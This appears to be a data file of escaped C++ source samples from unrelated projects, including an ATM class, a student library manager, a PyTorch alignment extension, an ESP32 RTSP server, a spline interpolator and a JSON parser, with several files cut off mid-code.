    "\ufeff#include \"ATM.h\"\r\n#include <iostream>\r\n\r\nATM::ATM(Database& db) : db(db), current_card(nullptr), current_account(nullptr) {}\r\n\r\nbool ATM::insertCard(const std::string& card_number, const std::string& pin_code)\r\n{\r\n    if (!db.cardExists(card_number))\r\n    {\r\n        std::cerr << \"Invalid card number\" << std::endl;\r\n        return false;\r\n    }\r\n    Card* card = new Card(card_number, pin_code);\r\n    if (card->authenticate(db))\r\n    {\r\n        current_card = card;\r\n        current_account = new Account(card_number);\r\n        return true;\r\n    }\r\n    delete card;\r\n    return false;\r\n}\r\n\r\nvoid ATM::showBalance()\r\n{\r\n    if (current_account)\r\n    {\r\n        std::cout << \"Balance: \" << current_account->getBalance(db) << std::endl;\r\n    }\r\n}\r\n\r\nbool ATM::deposit(double amount)\r\n{\r\n    return current_account && current_account->deposit(db, amount);\r\n}\r\n\r\nbool ATM::withdraw(double amount)\r\n{\r\n    return current_account && current_account->withdraw(db, amount);\r\n}\r\n\r\nbool ATM::transfer(const std::string& to_card_number, double amount)\r\n{\r\n    return current_account && current_account->transfer(db, to_card_number, amount);\r\n}\r\n\r\nvoid ATM::ejectCard()\r\n{\r\n    delete current_card;\r\n    delete current_account;\r\n    current_card = nullptr;\r\n    current_account = nullptr;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <algorithm>\nusing namespace std; // namespace std \uc0ac\uc6a9\n\nclass Book {\npublic:\n    string title;\n    string author;\n    int bookPcs = 0;\n    Book(const string& title, const string& author, const int& bookPcs)\n        : title(title), author(author), bookPcs(bookPcs) {\n    }\n};\n\nclass BookManager {\nprivate:\n    vector<Book> books; // \ucc45 \ubaa9\ub85d \uc800\uc7a5\n    vector<Book> rentalBooks; // \ub300\uc5ec\ud55c \ucc45 \ubaa9\ub85d \uc800\uc7a5\npublic:\n    // \ucc45 \ucd94\uac00 \uba54\uc11c\ub4dc\n    void addBook(const string& title, const string& author, const int& bookPcs) {\n        books.push_back(Book(title, author, bookPcs)); // push_back \uc0ac\uc6a9\n        cout << \"\ucc45\uc774 \ucd94\uac00\ub418\uc5c8\uc2b5\ub2c8\ub2e4: \" << title << \" by \" << author << \"   \" << bookPcs << \"\uad8c\" << endl;\n    }\n    void rentalBook(Book book)\n    {\n        for (int i = 0; i < books.size(); i++)\n        {\n            if (books[i].author == book.author && books[i].title == book.title)\n            {\n                books[i].bookPcs--;\n                rentalBooks.push_back(books[i]);\n            }\n            break;\n        }\n    }\n    void returnBook()\n    {\n        if (rentalBooks.empty()) {\n            cout << \"\ud604\uc7ac \ub300\uc5ec\ud55c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n            return;\n        }\n\n        cout << \"\ud604\uc7ac \ub300\uc5ec \ub3c4\uc11c \ubaa9\ub85d:\" << endl;\n        for (size_t i = 0; i < rentalBooks.size(); i++) { // \uc77c\ubc18\uc801\uc778 for\ubb38 \uc0ac\uc6a9\n            cout << \"-\" << i << \"  \" << books[i].title << \" by \" << books[i].author << endl;\n        }\n        cout << \"\ubc18\ub0a9\ud558\ub824\ub294 \ub3c4\uc11c\uc758 \ubc88\ud638\ub97c \uc785\ub825\ud574\uc8fc\uc138\uc694.\\n \uc785\ub825:  \";\n        int bookNum = 0;\n        cin >> bookNum;\n        Book retuningBook = searchBook(rentalBooks[bookNum].title);\n        for (int i = 0; i < books.size(); i++)\n        {\n            if (books[i].title == retuningBook.title && books[i].author == retuningBook.author)\n            {\n                books[i].bookPcs++;\n                break;\n            }\n        }\n        rentalBooks.erase(rentalBooks.begin() + bookNum);\n        cout << \"\ub3c4\uc11c \ubc18\ub0a9\uc774 \uc644\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\\n\";\n    }\n    // \ubaa8\ub4e0 \ucc45 \ucd9c\ub825 \uba54\uc11c\ub4dc\n    void displayAllBooks() const {\n        if (books.empty()) {\n            cout << \"\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n            return;\n        }\n\n        cout << \"\ud604\uc7ac \ub3c4\uc11c \ubaa9\ub85d:\" << endl;\n        for (size_t i = 0; i < books.size(); i++) { // \uc77c\ubc18\uc801\uc778 for\ubb38 \uc0ac\uc6a9\n            cout << \"- \" << books[i].title << \" by \" << books[i].author << endl;\n        }\n    }\n\n    Book searchBook(string keyword)\n    {\n        bool isFind = false;\n        for (int i = 0; i < books.size(); i++)\n        {\n           if (!books[i].title.compare(keyword) || !books[i].author.compare(keyword))\n           {\n               isFind = true;\n               return books[i];\n           }\n        }\n        if (!isFind)\n        {\n            Book nullBook(\"Null\", \"Null\", 0);\n            return nullBook;\n        }\n    }\n};\n\nint main() {\n    BookManager manager;\n\n    // \ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\uc758 \uae30\ubcf8 \uba54\ub274\ub97c \ubc18\ubcf5\uc801\uc73c\ub85c \ucd9c\ub825\ud558\uc5ec \uc0ac\uc6a9\uc790 \uc785\ub825\uc744 \ucc98\ub9ac\ud569\ub2c8\ub2e4.\n    // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\ub97c \uc120\ud0dd\ud558\uae30 \uc804\uae4c\uc9c0 \uacc4\uc18d \ub3d9\uc791\ud569\ub2c8\ub2e4.\n    while (true) {\n        cout << \"\\n\ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\" << endl;\n        cout << \"1. \ucc45 \ucd94\uac00\" << endl; // \ucc45 \uc815\ubcf4\ub97c \uc785\ub825\ubc1b\uc544 \ucc45 \ubaa9\ub85d\uc5d0 \ucd94\uac00\n        cout << \"2. \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\" << endl; // \ud604\uc7ac \ucc45 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n        cout << \"3. \ucc45 \uac80\uc0c9\" << endl; // \ud604\uc7ac \ucc45 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ucc45 \uc911 \uc791\uac00 or \uc81c\ubaa9\uc73c\ub85c \ucc45 \uac80\uc0c9\n        cout << \"4. \ucc45 \ub300\uc5ec\" << endl; // \ud604\uc7ac \ucc45 \ubaa9\ub85d \uc911 \uc6d0\ud558\ub294 \ucc45\uc744 \ub300\uc5ec(\uc7ac\uace0 \uc5c6\uc744 \uc2dc \ubd88\uac00\ub2a5)\n        cout << \"5. \ucc45 \ub300\uc5ec\" << endl; // \ud604\uc7ac \ucc45 \ubaa9\ub85d \uc911 \uc6d0\ud558\ub294 \ucc45\uc744 \ub300\uc5ec(\uc7ac\uace0 \uc5c6\uc744 \uc2dc \ubd88\uac00\ub2a5)\n        cout << \"6. \uc885\ub8cc\" << endl; // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\n        cout << \"\uc120\ud0dd: \";\n\n        int choice; // \uc0ac\uc6a9\uc790\uc758 \uba54\ub274 \uc120\ud0dd\uc744 \uc800\uc7a5\n        cin >> choice;\n\n        if (choice == 1) {\n            // 1\ubc88 \uc120\ud0dd: \ucc45 \ucd94\uac00\n            // \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \ucc45 \uc81c\ubaa9\uacfc \uc800\uc790\uba85\uc744 \uc785\ub825\ubc1b\uc544 BookManager\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4.\n            string title, author;\n            int bookPcs;\n            cout << \"\ucc45 \uc81c\ubaa9: \";\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n            getline(cin, title); // \uc81c\ubaa9 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            cout << \"\ucc45 \uc800\uc790: \";\n            getline(cin, author); // \uc800\uc790\uba85 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            cout << \"\ucc45 \uad8c\uc218: \";\n            cin >> bookPcs;\n            manager.addBook(title, author, bookPcs); // \uc785\ub825\ubc1b\uc740 \ucc45 \uc815\ubcf4\ub97c \ucd94\uac00\n        }\n        else if (choice == 2) {\n            // 2\ubc88 \uc120\ud0dd: \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n            // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            manager.displayAllBooks();\n        }\n        else if (choice == 3) \n        {\n            // 3\ubc88 \uc120\ud0dd: \ucc45 \uac80\uc0c9\n            // \ud604\uc7ac \ucc45 \ubaa9\ub85d \uc911 \uc791\uac00 or \uc81c\ubaa9\uc73c\ub85c \uac80\uc0c9\ub41c \ucc45 \ubaa9\ub85d\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            cout << \"\\n\ucc45 \uac80\uc0c9\uc744 \uc2dc\uc791\ud569\ub2c8\ub2e4.\" << endl;\n            cout << \"\uc785\ub825: \";\n            string searchKeyword;\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n            getline(cin, searchKeyword); // \uc81c\ubaa9 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            Book book = manager.searchBook(searchKeyword);\n            if (book.title == \"Null\")\n            {\n                cout << \"\uac80\uc0c9\ud558\uc2e0 \ud0a4\uc6cc\ub4dc\uc5d0 \ud574\ub2f9\ud558\ub294 \ucc45 \ub610\ub294 \uc791\uac00\uac00 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n                return 0;\n            }\n            cout << \"\uac80\uc0c9 \uacb0\uacfc: \" << book.title << \" by \" << book.author << \"   \" << book.bookPcs << \"\uad8c\" << endl;\n        }\n        else if (choice == 4)\n        {\n            // 4\ubc88 \uc120\ud0dd: \ucc45 \ub300\uc5ec\n            // \ud604\uc7ac \ucc45 \ubaa9\ub85d \uc911 \uc6d0\ud558\ub294 \ucc45\uc744 \uc7ac\uace0\uac00 \uc788\uc744 \uacbd\uc6b0 \ub300\uc5ec\ud574\uc90d\ub2c8\ub2e4.\n            string title;\n            cout << \"\\n\ucc45 \ub300\uc5ec\ub97c \uc2dc\uc791\ud569\ub2c8\ub2e4. \uc6d0\ud558\ub294 \ucc45 \uc774\ub984\uc744 \uc785\ub825\ud574\uc8fc\uc138\uc694.\" << endl;\n            manager.displayAllBooks();\n            cout << \"\uc785\ub825: \";\n      ",
    "#include <torch/extension.h>\n\ntorch::Tensor maximum_path_cpp(const torch::Tensor& neg_cent, const torch::Tensor& mask) {\n    int64_t batch_size = neg_cent.size(0);\n    torch::Tensor path = torch::zeros_like(neg_cent);\n    torch::Tensor t_t_max = mask.sum(1).index({torch::indexing::Slice(), 0}).to(torch::kInt);\n    torch::Tensor t_s_max = mask.sum(2).index({torch::indexing::Slice(), 0}).to(torch::kInt);\n\n    torch::parallel_for(\n        0, batch_size, torch::internal::GRAIN_SIZE,\n        [&](int64_t start, int64_t end) {\n            for (int64_t batch_idx = start; batch_idx < end; batch_idx++) {\n                // maximum_path_each(path[batch_idx], neg_cent[batch_idx], t_t_max[batch_idx].item().toInt(),\n                //                   t_s_max[batch_idx].item().toInt());\n                auto path_b = path[batch_idx];\n                auto value = neg_cent[batch_idx];\n                int t_y = t_t_max[batch_idx].item<int>();\n                int t_x = t_s_max[batch_idx].item<int>();\n                float max_neg_val=-1e9;\n                int index = t_x - 1;\n\n                for (int y = 0; y < t_y; y++) {\n                    for (int x = std::max(0, t_x + y - t_y); x < std::min(t_x, y + 1); x++) {\n                        float v_cur;\n                        float v_prev;\n                        if (x == y) {\n                            v_cur = max_neg_val;\n                        }\n                        else {\n                            v_cur = value.index({y - 1, x}).item<float>();\n                        }\n                        if (x == 0) {\n                            if (y == 0) {\n                                v_prev = 0.;\n                            }\n                            else {\n                                v_prev = max_neg_val;\n                            }\n                        }\n                        else {\n                            v_prev = value.index({y - 1, x - 1}).item<float>();\n                        }\n                        value.index({y, x}) += std::max(v_prev, v_cur);\n                    }\n                }\n\n                for (int y_n = t_y - 1; y_n >= 0; y_n--) {\n                    path_b.index({y_n, index}) = 1;\n                    if ((index != 0) && (index == y_n || value.index({y_n - 1, index}).item<float>() < value.index({y_n - 1, index - 1}).item<float>())) {\n                        index -= 1;\n                    }\n                }\n            }\n        });\n    return path;\n}\n\nPYBIND11_MODULE(TORCH_EXTENSION_NAME, m) {\n    m.doc() = \"Module with search monotonic alignment algorithm\";\n    m.def(\"maximum_path_cpp\", &maximum_path_cpp,\n          \"Search monotonic alignment algorithm\");\n}",
    "#include \"ESP32-RTSPServer.h\"\n\nconst char* RTSPServer::LOG_TAG = \"RTSPServer\";\n\nRTSPServer::RTSPServer()\n  : rtpFps(0),\n    // User can change these settings\n    transport(VIDEO_ONLY), // Default transport \n    sampleRate(0),\n    rtspPort(554),\n    rtpIp(IPAddress(239, 255, 0, 1)), // Default RTP IP \n    rtpTTL(64), // Default TTL\n    rtpVideoPort(5430),\n    rtpAudioPort(5432),\n    rtpSubtitlesPort(5434),\n    maxRTSPClients(3),\n    //\n    rtspSocket(-1),\n    videoUnicastSocket(-1),\n    audioUnicastSocket(-1), \n    subtitlesUnicastSocket(-1),\n    videoMulticastSocket(-1),\n    audioMulticastSocket(-1),\n    subtitlesMulticastSocket(-1),\n    activeRTSPClients(0),\n    maxClients(1),\n    rtpVideoTaskHandle(NULL),\n    rtspTaskHandle(NULL),\n    rtspStreamBuffer(NULL),\n    rtspStreamBufferSize(0),\n    rtpFrameSent(true),\n    rtpAudioSent(true),\n    rtpSubtitlesSent(true),\n    vQuality(0),\n    vWidth(0),\n    vHeight(0),\n    videoSequenceNumber(0),\n    videoTimestamp(0),\n    audioSequenceNumber(0),\n    audioTimestamp(0),\n    subtitlesSequenceNumber(0),\n    subtitlesTimestamp(0),\n    rtpFrameCount(0),\n    lastRtpFPSUpdateTime(0),\n    videoCh(0),\n    audioCh(0),\n    subtitlesCh(0),\n    isVideo(false),\n    isAudio(false),\n    isSubtitles(false),\n    isPlaying(false),\n    firstClientConnected(false),\n    firstClientIsMulticast(false),\n    firstClientIsTCP(false),\n    authEnabled(false) // Initialize authEnabled to false\n{\n    isPlayingMutex = xSemaphoreCreateMutex(); // Initialize the mutex\n    sendTcpMutex = xSemaphoreCreateMutex(); // Initialize the mutex\n    maxClientsMutex = xSemaphoreCreateMutex();\n#ifdef RTSP_LOGGING_ENABLED\n    esp_log_level_set(LOG_TAG, ESP_LOG_DEBUG); // Set log level to DEBUG\n#endif\n}\n\nRTSPServer::~RTSPServer() {\n  // Clean up resources\n  deinit();\n  vSemaphoreDelete(this->isPlayingMutex);\n  vSemaphoreDelete(this->sendTcpMutex);\n  vSemaphoreDelete(this->maxClientsMutex);\n}\n\nbool RTSPServer::init(TransportType transport, uint16_t rtspPort, uint32_t sampleRate, uint16_t port1, uint16_t port2, uint16_t port3, IPAddress rtpIp, uint8_t rtpTTL) {\n  this->transport = (transport != NONE) ? transport : this->transport;\n  this->rtspPort = (rtspPort != 0) ? rtspPort : this->rtspPort;\n  this->rtpIp = (rtpIp != IPAddress()) ? rtpIp : this->rtpIp;\n  this->rtpTTL = (rtpTTL != 255) ? rtpTTL : this->rtpTTL;\n\n  if (transport == AUDIO_ONLY || transport == VIDEO_AND_AUDIO || transport == AUDIO_AND_SUBTITLES || transport == VIDEO_AUDIO_SUBTITLES) {\n    if (this->sampleRate == 0 && sampleRate == 0) {\n      if (Serial) {\n        Serial.printf(\"RTSP Server Error: Sample rate must be set to use audio\\n\");\n      }\n      return false;\n    }\n    if (sampleRate != 0) {\n      this->sampleRate = sampleRate;\n    }\n  }\n\n  switch (this->transport) {\n    case VIDEO_ONLY:\n      this->rtpVideoPort = (port1 != 0) ? port1 : this->rtpVideoPort;\n      this->isVideo = true;\n      break;\n    case AUDIO_ONLY:\n      this->rtpAudioPort = (port1 != 0) ? port1 : this->rtpAudioPort;\n      this->isAudio = true;\n      break;\n    case SUBTITLES_ONLY:\n      this->rtpSubtitlesPort = (port1 != 0) ? port1 : this->rtpSubtitlesPort;\n      this->isSubtitles = true;\n      break;\n    case VIDEO_AND_AUDIO:\n      this->rtpVideoPort = (port1 != 0) ? port1 : this->rtpVideoPort;\n      this->rtpAudioPort = (port2 != 0) ? port2 : this->rtpAudioPort;\n      this->isVideo = true;\n      this->isAudio = true;\n      break;\n    case VIDEO_AND_SUBTITLES:\n      this->rtpVideoPort = (port1 != 0) ? port1 : this->rtpVideoPort;\n      this->rtpSubtitlesPort = (port2 != 0) ? port2 : this->rtpSubtitlesPort;\n      this->isVideo = true;\n      this->isSubtitles = true;\n      break;\n    case AUDIO_AND_SUBTITLES:\n      this->rtpAudioPort = (port1 != 0) ? port1 : this->rtpAudioPort;\n      this->rtpSubtitlesPort = (port2 != 0) ? port2 : this->rtpSubtitlesPort;\n      this->isAudio = true;\n      this->isSubtitles = true;\n      break;\n    case VIDEO_AUDIO_SUBTITLES:\n      this->rtpVideoPort = (port1 != 0) ? port1 : this->rtpVideoPort;\n      this->rtpAudioPort = (port2 != 0) ? port2 : this->rtpAudioPort;\n      this->rtpSubtitlesPort = (port3 != 0) ? port3 : this->rtpSubtitlesPort;\n      this->isVideo = true;\n      this->isAudio = true;\n      this->isSubtitles = true;\n      break;\n    case NONE:\n      RTSP_LOGE(LOG_TAG, \"Transport type can not be NONE\");\n      return false;\n    default:\n      RTSP_LOGE(LOG_TAG, \"Invalid transport type for this init method\");\n      return false;\n  }\n\n  return prepRTSP();\n}\n\nvoid RTSPServer::deinit() {\n  if (this->rtspTaskHandle != NULL) {\n    vTaskDelete(this->rtspTaskHandle);\n    this->rtspTaskHandle = NULL;\n  }\n  if (this->rtpVideoTaskHandle != NULL) {\n    vTaskDelete(this->rtpVideoTaskHandle);\n    this->rtpVideoTaskHandle = NULL;\n  }\n  if (this->rtspSocket >= 0) {\n    close(this->rtspSocket);\n    this->rtspSocket = -1;\n  }\n  \n  closeSockets();\n  \n  if (this->rtspStreamBuffer) {\n    free(this->rtspStreamBuffer);\n  }\n\n  RTSP_LOGI(LOG_TAG, \"RTSP server dein",
    "/*\n *  Copyright (c) 2022 NetEase Inc.\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n */\n\n/*\n * Project: dingo\n * Date: Thursday Jun 02 17:32:58 CST 2022\n * Author: wuhanqing\n */\n\n#include \"common/threading.h\"\n\n#include <glog/logging.h>\n#include <sys/prctl.h>\n#include <sys/syscall.h>\n\nnamespace dingofs {\nnamespace common {\n\nnamespace {\n\npid_t gettid() { return syscall(SYS_gettid); }\n\n}  // namespace\n\nvoid SetThreadName(const char* name) {\n  // skip main thread\n  if (getpid() == gettid()) {\n    return;\n  }\n\n  int ret = prctl(PR_SET_NAME, name);\n\n  if (ret != 0) {\n    LOG(WARNING) << \"Failed to set thread name, tid: \" << gettid()\n                 << \", error: \" << errno;\n  }\n}\n\n}  // namespace common\n}  // namespace dingofs\n",
    "#include \"SplineInterpolator.hpp\"\n#include <stdexcept>\n#include <algorithm>\n#include <iostream>\n\nSplineInterpolator::SplineInterpolator(const std::vector<Point>& pts) : points(pts) {\n\tsetupData();\n}\n\nSplineInterpolator::SplineInterpolator() {}\n\nvoid SplineInterpolator::setupData()\n{\n\tif (points.size() < 2) \n\tthrow std::invalid_argument(\"At least two points are required for spline interpolation.\");\n\n\tint n = points.size() - 1;\n\th.resize(n);\n\ta.resize(n + 1);\n\tb.resize(n);\n\tc.resize(n + 1, 0.0);\n\td.resize(n);\n\n\t// Step 1: Compute h and a\n\tfor (int i = 0; i < n; ++i)\n\t{\n\t\th[i] = points[i + 1].x - points[i].x;\n\t\tif (h[i] <= 0.0)\n\t\t\tthrow std::invalid_argument(\"Points must have strictly increasing x values.\");\n\t\ta[i] = points[i].y;\n\t}\n\ta[n] = points[n].y;\n\n\t// Step 2: Compute alpha\n\tstd::vector<double> alpha(n, 0.0);\n\tfor (int i = 1; i < n; ++i)\n\t{\n\t\talpha[i] = (3.0 / h[i]) * (points[i + 1].y - points[i].y) -\n\t\t\t\t\t(3.0 / h[i - 1]) * (points[i].y - points[i - 1].y);\n\t}\n\n\t// Step 3: Setup tridiagonal matrix\n\tstd::vector<double> l(n + 1, 0.0), mu(n, 0.0), z(n + 1, 0.0);\n\tl[0] = 1.0;\n\tl[n] = 1.0;\n\tz[0] = 0.0;\n\tz[n] = 0.0;\n\n\tfor (int i = 1; i < n; ++i)\n\t{\n\t\tl[i] = 2.0 * (points[i + 1].x - points[i - 1].x) - h[i - 1] * mu[i - 1];\n\t\tif (l[i] == 0.0) throw std::runtime_error(\"Singular matrix detected.\");\n\t\tmu[i] = h[i] / l[i];\n\t\tz[i] = (alpha[i] - h[i - 1] * z[i - 1]) / l[i];\n\t}\n\n\t// Step 4: Back substitution\n\tfor (int j = n - 1; j >= 0; --j)\n\t{\n\t\tc[j] = z[j] - mu[j] * c[j + 1];\n\t\tb[j] = (points[j + 1].y - points[j].y) / h[j] - h[j] * (c[j + 1] + 2.0 * c[j]) / 3.0;\n\t\td[j] = (c[j + 1] - c[j]) / (3.0 * h[j]);\n\t}\n}\n\n\n\ndouble SplineInterpolator::interpolate(double x) const {\n\tif (x < points.front().x || x > points.back().x)\n\t\treturn 0.0;\n\n\t// Find the correct interval\n\tint n = points.size() - 1;\n\tint i = n - 1;\n\tfor (int j = 0; j < n; ++j)\n\t{\n\t\tif (x <= points[j + 1].x)\n\t\t{\n\t\t\ti = j;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// Compute spline value\n\tdouble dx = x - points[i].x;\n\treturn a[i] + b[i] * dx + c[i] * dx * dx + d[i] * dx * dx * dx;\n}\n\nvoid SplineInterpolator::setPoints(const std::vector<Point> &pts)\n{\n\tpoints = pts;\n\tsetupData();\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\n// Konstanta\nconst int MAX_ORDERS = 100;\n\n// Variabel global\nstring ownerNames[MAX_ORDERS];\nstring conditions[MAX_ORDERS];\nstring treatmentNames[MAX_ORDERS];\ndouble treatmentPrices[MAX_ORDERS];\nstring statuses[MAX_ORDERS];\n\nint dailyCapacity = 0;\nint currentOrders = 0;\ndouble dailyRevenue = 0.0;\n\n// Fungsi\nvoid initializeSystem(int capacity) {\n    if (capacity > 0 && capacity <= MAX_ORDERS) {\n        dailyCapacity = capacity;\n        currentOrders = 0;\n        dailyRevenue = 0.0;\n        cout << \"System initialized with daily capacity: \" << dailyCapacity << \" orders.\\n\";\n    } else {\n        cout << \"Invalid capacity. Must be between 1 and \" << MAX_ORDERS << \".\\n\";\n    }\n}\n\nvoid addOrder(const string& ownerName, const string& condition, const string& treatmentName, double price) {\n    if (currentOrders < dailyCapacity) {\n        ownerNames[currentOrders] = ownerName;\n        conditions[currentOrders] = condition;\n        treatmentNames[currentOrders] = treatmentName;\n        treatmentPrices[currentOrders] = price;\n        statuses[currentOrders] = \"In Progress\";\n        currentOrders++;\n        cout << \"Order added for \" << ownerName << \".\\n\";\n    } else {\n        cout << \"Daily capacity reached. Cannot add more orders.\\n\";\n    }\n}\n\nvoid updateStatus(int index, const string& newStatus) {\n    if (index >= 0 && index < currentOrders) {\n        statuses[index] = newStatus;\n        cout << \"Status of order \" << index << \" updated to: \" << newStatus << \".\\n\";\n    } else {\n        cout << \"Invalid order index.\\n\";\n    }\n}\n\nvoid completeOrder(int index) {\n    if (index >= 0 && index < currentOrders) {\n        if (statuses[index] != \"Completed\") {\n            dailyRevenue += treatmentPrices[index];\n            statuses[index] = \"Completed\";\n            cout << \"Order \" << index << \" completed for \" << ownerNames[index] << \".\\n\";\n        } else {\n            cout << \"Order \" << index << \" is already completed.\\n\";\n        }\n    } else {\n        cout << \"Invalid order index.\\n\";\n    }\n}\n\nvoid showOrders() {\n    if (currentOrders == 0) {\n        cout << \"No orders available.\\n\";\n    } else {\n        cout << \"Current Orders:\\n\";\n        for (int i = 0; i < currentOrders; ++i) {\n            cout << i << \": \" << ownerNames[i]\n                 << \" (\" << conditions[i] << \") - \" << treatmentNames[i]\n                 << \" - \" << statuses[i] << \"\\n\";\n        }\n    }\n}\n\nvoid showRevenue() {\n    cout << \"Total Revenue: $\" << dailyRevenue << \"\\n\";\n}\n\nint main() {\n    initializeSystem(5);\n    \n    addOrder(\"Alice\", \"New\", \"Cleaning\", 50.0);\n    addOrder(\"Bob\", \"Worn\", \"Polishing\", 30.0);\n    \n    showOrders();\n    \n    completeOrder(0);\n    updateStatus(1, \"Pending\");\n    \n    showOrders();\n    showRevenue();\n    \n    return 0;\n}\n",
    "// Crude implementation of JSON value object and parser.\n//\n// VERSION 0.1\n//\n// LICENSE\n//   This software is dual-licensed to the public domain and under the following\n//   license: you are granted a perpetual, irrevocable license to copy, modify,\n//   publish, and distribute this file as you see fit.\n//\n// CREDITS\n//   Written by Michal Cichon\n# include \"crude_json.h\"\n# include <iomanip>\n# include <limits>\n# include <cstdlib>\n# include <clocale>\n# include <cmath>\n# include <cstring>\n# if CRUDE_JSON_IO\n#     include <stdio.h>\n#     include <memory>\n# endif\n\nnamespace crude_json {\n\nvalue::value(value&& other)\n    : m_Type(other.m_Type)\n{\n    switch (m_Type)\n    {\n        case type_t::object:    construct(m_Storage, std::move( *object_ptr(other.m_Storage))); break;\n        case type_t::array:     construct(m_Storage, std::move(  *array_ptr(other.m_Storage))); break;\n        case type_t::string:    construct(m_Storage, std::move( *string_ptr(other.m_Storage))); break;\n        case type_t::boolean:   construct(m_Storage, std::move(*boolean_ptr(other.m_Storage))); break;\n        case type_t::number:    construct(m_Storage, std::move( *number_ptr(other.m_Storage))); break;\n        default: break;\n    }\n    destruct(other.m_Storage, other.m_Type);\n    other.m_Type = type_t::null;\n}\n\nvalue::value(const value& other)\n    : m_Type(other.m_Type)\n{\n    switch (m_Type)\n    {\n        case type_t::object:    construct(m_Storage,  *object_ptr(other.m_Storage)); break;\n        case type_t::array:     construct(m_Storage,   *array_ptr(other.m_Storage)); break;\n        case type_t::string:    construct(m_Storage,  *string_ptr(other.m_Storage)); break;\n        case type_t::boolean:   construct(m_Storage, *boolean_ptr(other.m_Storage)); break;\n        case type_t::number:    construct(m_Storage,  *number_ptr(other.m_Storage)); break;\n        default: break;\n    }\n}\n\nvalue& value::operator[](size_t index)\n{\n    if (is_null())\n        m_Type = construct(m_Storage, type_t::array);\n\n    if (is_array())\n    {\n        auto& v = *array_ptr(m_Storage);\n        if (index >= v.size())\n            v.insert(v.end(), index - v.size() + 1, value());\n\n        return v[index];\n    }\n\n    CRUDE_ASSERT(false && \"operator[] on unsupported type\");\n    std::terminate();\n}\n\nconst value& value::operator[](size_t index) const\n{\n    if (is_array())\n        return (*array_ptr(m_Storage))[index];\n\n    CRUDE_ASSERT(false && \"operator[] on unsupported type\");\n    std::terminate();\n}\n\nvalue& value::operator[](const string& key)\n{\n    if (is_null())\n        m_Type = construct(m_Storage, type_t::object);\n\n    if (is_object())\n        return (*object_ptr(m_Storage))[key];\n\n    CRUDE_ASSERT(false && \"operator[] on unsupported type\");\n    std::terminate();\n}\n\nconst value& value::operator[](const string& key) const\n{\n    if (is_object())\n    {\n        auto& o = *object_ptr(m_Storage);\n        auto it = o.find(key);\n        CRUDE_ASSERT(it != o.end());\n        return it->second;\n    }\n\n    CRUDE_ASSERT(false && \"operator[] on unsupported type\");\n    std::terminate();\n}\n\nbool value::contains(const string& key) const\n{\n    if (is_object())\n    {\n        auto& o = *object_ptr(m_Storage);\n        auto it = o.find(key);\n        return it != o.end();\n    }\n\n    return false;\n}\n\nvoid value::push_back(const value& value)\n{\n    if (is_null())\n        m_Type = construct(m_Storage, type_t::array);\n\n    if (is_array())\n    {\n        auto& v = *array_ptr(m_Storage);\n        v.push_back(value);\n    }\n    else\n    {\n        CRUDE_ASSERT(false && \"operator[] on unsupported type\");\n        std::terminate();\n    }\n}\n\nvoid value::push_back(value&& value)\n{\n    if (is_null())\n        m_Type = construct(m_Storage, type_t::array);\n\n    if (is_array())\n    {\n        auto& v = *array_ptr(m_Storage);\n        v.push_back(std::move(value));\n    }\n    else\n    {\n        CRUDE_ASSERT(false && \"operator[] on unsupported type\");\n        std::terminate();\n    }\n}\n\nsize_t value::erase(const string& key)\n{\n    if (!is_object())\n        return 0;\n\n    auto& o = *object_ptr(m_Storage);\n    auto it = o.find(key);\n\n    if (it == o.end())\n        return 0;\n\n    o.erase(it);\n\n    return 1;\n}\n\nvoid value::swap(value& other)\n{\n    using std::swap;\n\n    if (m_Type == other.m_Type)\n    {\n        switch (m_Type)\n        {\n            case type_t::object:    swap(*object_ptr(m_Storage),  *object_ptr(other.m_Storage));  break;\n            case type_t::array:     swap(*array_ptr(m_Storage),   *array_ptr(other.m_Storage));   break;\n            case type_t::string:    swap(*string_ptr(m_Storage),  *string_ptr(other.m_Storage));  break;\n            case type_t::boolean:   swap(*boolean_ptr(m_Storage), *boolean_ptr(other.m_Storage)); break;\n            case type_t::number:    swap(*number_ptr(m_Storage),  *number_ptr(other.m_Storage));  break;\n            default: break;\n        }\n    }\n    else\n    {\n        value tmp(std::move(other));\n        other.~value();\n        new (&other) value(std::move(*this));\n      ",
